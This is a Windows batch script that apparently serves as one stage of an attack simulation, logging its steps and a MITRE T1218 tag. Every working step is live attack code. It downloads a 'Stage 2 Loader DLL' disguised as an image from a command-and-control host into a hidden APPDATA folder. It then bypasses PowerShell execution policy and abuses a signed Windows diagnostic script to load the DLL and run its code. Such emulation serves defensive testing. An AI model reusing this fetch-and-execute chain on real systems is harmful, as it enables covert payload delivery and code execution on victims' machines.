@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aBcDeFgH=%APPDATA%\11991\d3b3f078
SET xYz123Ab=df5b19cf.txt
SET qWeRtY=https://10.0.0.49/stage/2/icon.png?11991-7
SET zXcVbNm=ITZEL-S2B
SET iOpAsDf=11991
SET uJnMjKl=7
SET lPoIkJh=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Log file path
SET logvar=!lPoIkJh!

REM Begin script
echo [!tsvar!][DEBUG][!zXcVbNm!][!iOpAsDf!]: script_start>> "!logvar!" 2>nul

REM Step 1: Heartbeat fetch — download Stage 2 Loader DLL from C2
echo [!tsvar!][DEBUG][!zXcVbNm!][!iOpAsDf!]: heartbeat_start>> "!logvar!" 2>nul
curl -k -s -o "!aBcDeFgH!\!xYz123Ab!" "!qWeRtY!" 2>> "!logvar!" 2>&1
echo [!tsvar!][DEBUG][!zXcVbNm!][!iOpAsDf!]: heartbeat_complete>> "!logvar!" 2>nul

REM Step 2: Position working directory
echo [!tsvar!][DEBUG][!zXcVbNm!][!iOpAsDf!]: chdir_start>> "!logvar!" 2>nul
cd /d "!aBcDeFgH!" >nul 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!zXcVbNm!][!iOpAsDf!]: chdir_result=1>> "!logvar!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!zXcVbNm!][!iOpAsDf!]: chdir_result=0>> "!logvar!" 2>nul
)

REM Step 3: Invoke downloaded Stage 2 DLL via PowerShell (LOLBIN)
echo [!tsvar!][DEBUG][!zXcVbNm!][!iOpAsDf!]: powershell_start>> "!logvar!" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\CL_LoadAssembly.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath %APPDATA%\11991\d3b3f078\df5b19cf.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
set ps_exit=%errorlevel%
echo [!tsvar!][DEBUG][!zXcVbNm!][!iOpAsDf!]: powershell_end=!ps_exit!>> "!logvar!" 2>nul

REM Step 4: TTP logging — generate timestamp and log result
set result=OK
set errortext=
if "!ps_exit!" neq "0" (
    set result=FAIL
    set errortext=exitcode=!ps_exit!
)
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t
echo [!timestamp!][TTP][!zXcVbNm!][!iOpAsDf!]: T1218^|System Binary Proxy Execution=!result!:!errortext!>> "!logvar!" 2>&1

REM Final debug log for this stage
echo [!tsvar!][DEBUG][!zXcVbNm!][!iOpAsDf!]: script_end>> "!logvar!" 2>nul

endlocal